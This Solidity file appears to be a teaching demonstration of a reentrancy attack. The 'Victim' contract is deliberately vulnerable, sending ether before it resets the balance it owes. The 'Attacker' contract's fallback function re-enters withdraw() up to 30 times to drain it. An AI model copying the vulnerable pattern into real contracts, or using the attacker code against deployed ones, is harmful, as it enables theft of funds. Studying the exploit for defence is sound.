pragma solidity ^0.4.6;

contract Victim{
    uint public owedToAttacker;
    
    function Victim()
    {
        owedToAttacker = 11;
    }
    
    function withdraw()
    {
        if(!msg.sender.call.value(owedToAttacker)()) throw;
        owedToAttacker = 0;
    }
    
    function deposit() 
        payable
    {
        
    }
}

contract Attacker {
    
    Victim v;
    uint public count;
    
    event LogFallback(uint count, uint balance);
    
    function Attacker(address victim)
        payable
    {
        v = Victim(victim);
    }
    
    function attack()
    {
        v.withdraw();
    }
    
    function ()
        payable
    {
        count++;
        LogFallback(count,this.balance);
        //crude stop before we run out of gas
        if(count < 30) v.withdraw();
    }
}
